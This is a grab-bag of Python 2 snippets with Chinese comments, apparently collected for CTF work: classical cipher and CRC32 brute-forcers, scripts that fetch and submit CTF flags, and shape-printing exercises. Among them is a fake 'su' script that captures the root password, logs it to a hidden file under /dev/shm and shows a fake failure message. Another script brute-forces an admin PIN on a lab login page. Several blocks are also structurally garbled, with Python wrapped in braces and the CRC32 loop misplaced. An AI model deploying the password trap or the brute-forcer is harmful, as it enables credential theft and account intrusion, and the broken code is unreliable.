        result.update({a:result[a] + e[i]})
    d = ''
    for i in range(b):
        d = d + result[i]
    print '分为\t'+str(f)+'\t'+'栏时，解密结果为：  '+d
}



#凯撒密码破解
{	
import sys

def move(src, num):
    for c in src:
        sys.stdout.write(chr(ord(c)+num))
    print
if len(sys.argv) != 2:
    print 'this.py text'
    exit(0)
ciphertext = sys.argv[1]
min,max = 0xff, 0
for c in ciphertext:
    now = ord(c)
    if now < min:
        min = now
    if now > max:
        max = now
rightmove = ord('~')-max
leftmove  = min - ord('0')
for i in range(1, rightmove+1):
    move(ciphertext, i)
for i in range(1, leftmove+1):
    move(ciphertext, -i)	
}


	
#CRC32爆破
{	
#!/usr/bin/env python 
# -*- coding: UTF-8 -*- 
########################################################## 
# 脚本二 : 修正了一些 BUG  , 可以正常打印日志 , 把握进度 # 
# 修改时间 : 2017/03/20 # TODO : 可以穷举的字典的顺序进行调整 , 以字母的统计频率进行调整 
# 可以提高整体穷举效率 
########################################################## 
import binascii 
import time 
import winsound 
startTime = time.time() 
# 程序开始运行 
#----------Config start----------# 
# 需要被破解的CRC32的值 
keys = [int("0xA359AFC1",16), int("0xCF5F72B9",16), int("0xDF7BF1C9",16), int("0x6E38B65E",16)] 
# 设置爆破的范围 , 默认所有可打印字符 
myRange = [' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'] 
# 注 : #     这里的代码可以穷举四位可打印字符 , 可以根据需要修改代码中的嵌套循环层数 #    不知道如何能使用参数控制循环嵌套的层数 , 如果有知道的小伙伴儿一定要联系我哦 , 一起进步 
#----------Config end----------# 
RESULT = {} 
# 结果字典 
def getCRC32(str): 
	'''
	计算CRC32
	''' 
	return (binascii.crc32(str) & 0xffffffff) 
def checkSuccess(keys, mycrc32, words): 
	'''
    检测是否成功匹配
    参数 : 
        keys : 所有需要爆破的CRC32值
        mycrc32 : 某次计算得到的明文(words)的CRC32
        words : 明文
    ''' 
	global RESULT 
	for key in keys: 
		if key == mycrc32: 
			RESULT[keys.index(key)] = words 
			words = "" 
			counter = 0 	# 用于计算速度 
			oldTime = time.clock() 
			for i in myRange: 
				nowTime = time.clock() 
				print "Trying : " + words + "\t" + "Speed : " + str(counter / (nowTime - oldTime)) + " / s" + "\t" + "Result : " + str(RESULT) 	# 输出日志 
				oldTime = nowTime 
				for j in myRange: 
					for k in myRange: 
						for l in myRange: 
							words = i + j + k + l 	# 构造明文 
							counter += 1 
							myCRC32 = getCRC32(words) # 计算明文CRC32 
							checkSuccess(keys, myCRC32, words) # 检查是否匹配 
endTime = time.time() 
print "Result : " + str(RESULT) 	# 输入爆破结果 
print "Cost : " + str(endTime-startTime) + " s" # 输出总花费时间
}

{
    #!/bin/bash/python  
    import sys  
    from collections import Counter  
    file = open(sys.argv[1], 'r')  
    readlist = []  
    count_times = []  
    for line in file.readlines():  
    line = line.strip('\r\n ')  
    readlist.append(line)  
    sortlist = Counter(readlist).most_common()  
    for line in sortlist:  
    print line[0]
}
	
#记录root密码小工具
{
    #!/usr/bin/python  
    import os, sys, getpass, time  
    current_time = time.strftime("%Y-%m-%d %H:%M")  
    logfile="/dev/shm/.su.log"              //密码获取后记录在这里  
    #CentOS                  
    #fail_str = "su: incorrect password"  
    #Ubuntu               
    #fail_str = "su: Authentication failure"  
    #For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样  
    fail_str = "su: incorrect password" 
    try:  
        passwd = getpass.getpass(prompt='Password: ');  
        file=open(logfile,'a')  
        file.write("[%s]t%s"%(passwd, current_time))   //截取root密码  
        file.write('n')  
        file.close()  
    except:  
        pass 
    time.sleep(1)  
    print fail_str                               //打印切换root失败提示 

}

#设置源端口反弹shell
{

}


#自动获取flag
{
    import requests   
    import base64  
      
    url='http://ctf4.shiyanbar.com/web/10.php'   
    req=requests.get(url)  
    print req.text  
    key=req.headers['FLAG']  
    key=base64.b64decode(key)  
    key=key.split(':')[1].strip()  
    data={'key':key}  
    r=requests.post(url,data=data)   
    print(r.text)  
}


#自动提交flag
{
import requests  
  
url = "http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"  
req = requests.session()  
header = {"Cookie":"PHPSESSID=9b8f8686269f5d70a44766e3c5f4dcdc"}  
for pwd in xrange(1000,10000):  
  
	data={'username':'admin','pwd':pwd,'vcode':'c3pe'}  
  
	ret = req.post(url, data=data, headers=header)  
	print ret.text  
	if 'error' not in ret.text:  
		print pwd  
		break  
}


#python 打印菱形、三角形、矩形
#coding:utf-8
rows = int(raw_input('输入列数： '))
i = j = k = 1 #声明变量，i用于控制外层循环（图形行数），j用于控制空格的个数，k用于控制*的个数
#等腰直角三角形1
print "等腰直角三角形1"
for i in range(0, rows):
    for k in range(0, rows - i):
        print " * ", #注意这里的","，一定不能省略，可以起到不换行的作用
        k += 1
    i += 1
    print "\n"
 
#打印实心等边三角形
print "打印空心等边三角形，这里去掉if-else条件判断就是实心的"
for i in range(0, rows + 1):#变量i控制行数
    for j in range(0, rows - i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(0, 2 * i - 1):#(1,2*i)
        if k == 0 or k == 2 * i - 2 or i == rows:
            if i == rows:
                if k % 2 == 0:#因为第一个数是从0开始的，所以要是偶数打印*，奇数打印空格
                    print "*",
                else:
                    print " ", #注意这里的","，一定不能省略，可以起到不换行的作用
            else:
               print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
 
#打印菱形
print "打印空心等菱形，这里去掉if-else条件判断就是实心的"
for i in range(rows):#变量i控制行数
    for j in range(rows - i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(2 * i - 1):#(1,2*i)
        if k == 0 or k == 2 * i - 2:
            print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
    #菱形的下半部分
for i in range(rows):
    for j in range(i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(2 * (rows - i) - 1):#(1,2*i)
        if k == 0 or k == 2 * (rows - i) - 2:
            print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
#实心正方形
print "实心正方形"
for i in range(0, rows):
    for k in range(0, rows):
        print " * ", #注意这里的","，一定不能省略，可以起到不换行的作用
        k += 1
    i += 1
    print "\n"
 
#空心正方形
print "空心正方形"
for i in range(0, rows):
    for k in range(0, rows):
        if i != 0 and i != rows - 1:
            if k == 0 or k == rows - 1:
                #由于视觉效果看起来更像正方形，所以这里*两侧加了空格，增大距离
                print " * ", #注意这里的","，一定不能省略，可以起到不换行的作用
            else:
                 print "   ", #该处有三个空格
        else:
            print " * ", #这里*两侧加了空格
        k += 1
    i += 1
    print "\n"